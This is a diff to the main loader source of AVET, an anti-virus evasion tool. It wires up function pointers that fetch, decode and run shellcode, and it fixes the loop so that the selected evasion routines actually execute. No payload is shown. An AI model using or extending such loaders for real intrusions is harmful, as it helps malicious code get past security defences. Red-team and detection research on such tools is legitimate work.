@@ -27,6 +27,12 @@ Web: https://github.com/govolution/avet
 //         "\n\nAnti Virus Evasion Tool by Daniel Sauder\n"
 
 
+#include <stdio.h>
+
+
+#define PRINT_DEBUG
+
+
 // Include implementation files needed for the selected functions.
 // The included files are assembled by the build script, in which functions are selected.
 #include "evasion/evasion.include"
@@ -43,10 +49,10 @@ Web: https://github.com/govolution/avet
 int main (int argc, char **argv)
 {		
 	// Function prototype pointers to store selected functions.	
-	unsigned char *(*get_shellcode) (char *arg1, int *shellcode_size);
-	unsigned char *(*get_key) (char *arg1, int *key_length);
-	void (*decode_shellcode) (const unsigned char *ciphertext, const int ciphertext_length, const unsigned char *key, const int key_length, unsigned char *plaintext);
-	void (*bind_shellcode) (unsigned char *shellcode);
+	unsigned char *(*get_shellcode) (char *arg1, int *shellcode_size) = NULL;
+	unsigned char *(*get_key) (char *arg1, int *key_length) = NULL;
+	void (*decode_shellcode) (const unsigned char *ciphertext, const int ciphertext_length, const unsigned char *key, const int key_length, unsigned char *plaintext) = NULL;
+	void (*bind_shellcode) (unsigned char *shellcode) = NULL;
 	
 	// Define array to store multiple evasion functions.
 	// Set static array size of 10 because dynamic size handling in cooperation with build scripts would be too messy.
@@ -68,8 +74,10 @@ int main (int argc, char **argv)
 		
 	// Execute evasion functions
 	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
-		evasion_functions[i];
-	}
+		if(evasion_functions[i] != NULL) {			
+			evasion_functions[i]("");
+		}
+	}	
 	
 	// Retrieve encoded shellcode
 	int shellcode_size = 0;
